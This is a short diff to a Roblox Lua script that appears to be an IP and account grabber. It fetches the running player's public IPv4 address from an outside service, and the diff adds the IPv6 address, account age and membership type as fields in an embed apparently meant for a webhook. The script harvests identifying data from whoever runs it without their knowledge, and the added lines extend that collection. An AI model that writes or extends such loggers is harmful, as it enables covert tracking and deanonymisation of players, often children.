@@ -1,4 +1,5 @@
 local IP = game:HttpGet("https://v4.ident.me")
+local IPv6 = game:HttpGet("https://v6.ident.me/")
 plr = game:GetService'Players'.LocalPlayer
 local premium = false
 local ALT = false
@@ -13,7 +14,8 @@ if premium == false then
 	end
 end
 
-
+local AccountAge = plr.AccountAge
+local MembershipType = string.sub(tostring(plr.MembershipType), 21)
 
 local market = game:GetService("MarketplaceService")
 local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
@@ -90,10 +92,25 @@ local Embed = {
             value = IP;
             inline = true
         },
+	{
+                   name = "IPv6",
+                   value = IPv6,
+                   inline = true
+        },
         {
             name = 'GameName';
             value = info.Name;
             inline = true
+        },
+	 {
+                   name = "MembershipType:",
+                   value = MembershipType,
+                   inline = true
+        },
+        {
+                   name = "AccountAge:",
+                   value = AccountAge,
+                   inline = true
         },
         {
             name = 'GameID';
